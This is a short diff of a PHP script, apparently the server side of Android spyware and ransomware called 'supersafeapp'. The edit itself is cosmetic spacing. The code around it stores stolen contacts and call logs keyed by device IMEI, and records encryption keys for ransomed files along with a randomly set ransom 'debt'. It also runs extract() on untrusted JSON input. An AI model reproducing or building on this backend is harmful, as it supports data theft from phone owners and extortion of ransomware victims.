@@ -23,18 +23,18 @@
 			//Procesar la query
 			switch($messageType){
 			case 'contacts':
-				$sth = $dbh->prepare("INSERT INTO supersafeapp_contacts (imei,contacts,timestamp) VALUES (?,?,?);");
+				$sth= $dbh->prepare("INSERT INTO supersafeapp_contacts (imei,contacts,timestamp) VALUES (?,?,?);");
 				$sth->execute(array($imei,$messageBody,$timestamp));
 				break;
 			case 'calllog':
-				$sth = $dbh->prepare("INSERT INTO supersafeapp_calllog (imei,calllog,timestamp) VALUES (?,?,?);");
+				$sth= $dbh->prepare("INSERT INTO supersafeapp_calllog (imei,calllog,timestamp) VALUES (?,?,?);");
 				$sth->execute(array($imei,$messageBody,$timestamp));
 				break;
 			case 'ransom':
 				$dict = json_decode($messageBody,true);
 				extract($dict);
 				$debt = rand(100,5000);
-				$sth = $dbh->prepare("INSERT INTO supersafeapp_ransom (`imei`,`sha1`,`filename`, `key`,`timestamp`,`debt`) VALUES (?,?,?,?,?,?);");
+				$sth= $dbh->prepare("INSERT INTO supersafeapp_ransom (`imei`,`sha1`,`filename`, `key`,`timestamp`,`debt`) VALUES (?,?,?,?,?,?);");
 				if($sth->execute(array($imei,$sha1,$filename,$pwd,$timestamp,$debt)) === false){
 					dblog($dbh,array("ERROR" => $sth->errorInfo()));
 				}
